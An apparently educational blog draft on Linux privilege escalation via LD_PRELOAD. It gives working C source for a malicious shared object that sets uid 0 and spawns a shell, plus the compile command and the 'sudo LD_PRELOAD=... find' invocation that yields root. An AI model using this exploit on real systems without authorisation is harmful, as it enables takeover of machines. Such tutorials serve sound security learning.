---
title: "LD PRELOAD"
description: 
date: 2025-01-24T13:21:32Z
image: 
math: 
license: 
hidden: false
comments: true
draft: true
---



## **Linux Privilege Escalation Using LD_PRELOAD**

**LD_PRELOAD** is an environment variable in Linux that allows users to load custom shared libraries before any other libraries during the execution of a program. Attackers can exploit this feature to inject malicious code and potentially escalate privileges, especially if the target program is executed with elevated permissions (e.g., as `root`).

## **How LD_PRELOAD Works**

1. **Purpose**: LD_PRELOAD is used for debugging or testing by overriding functions in shared libraries.
2. **Mechanism**: When a program is executed, the dynamic linker checks the LD_PRELOAD variable for a shared library path. If specified, this library is loaded before others, allowing its functions to override standard library functions.

## Privilege Escalation

  ![image alt text](post/ldpreload.png)

Let’s generate a C program file inside the `/tmp` directory.

![C Program File Example](https://1.bp.blogspot.com/-B9yPaw7TbHU/WyKXUU2u8iI/AAAAAAAAXXo/pyxfa1xrXn8Pr1il5ziHSB2ppZ2MQN2AACEwYBhgL/s1600/4.png)

```c
#include <stdio.h> 
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); 
    setuid(0);

    system("/bin/sh"); 
}
```
Save it as `shell.c` inside **/tmp**.

![Compiling the Shell Program](https://3.bp.blogspot.com/-H4g6p2ggbfA/WyKXVJnFfCI/AAAAAAAAXYE/jtgOe57paVYSq5EPS7ddVbVRiOFsP3m8gCEwYBhgL/s1600/5.png)

Next, compile it to generate a shared object with a `.so` extension, similar to a `.dll` file in the Windows operating system. Enter the following command:

```shell
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Check the generated file:

```shell
ls -al shell.so
```

Now execute the `find` command with `LD_PRELOAD` set to the path of the shared object:

```shell
sudo LD_PRELOAD=/tmp/shell.so find
```

To verify the privileges, run:

```shell
id
whoami
```
![](https://1.bp.blogspot.com/-SmdjE6lvzUI/WyKXVZ-5akI/AAAAAAAAXYM/ic2oN4QGsc4xmfyDUrwUMmWV0uL5bDntgCEwYBhgL/s1600/6.png)

And finally, you should have obtained root privileges! 😉


## Resources :
- https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
- https://www.youtube.com/watch?v=bzjnIi5u9OQ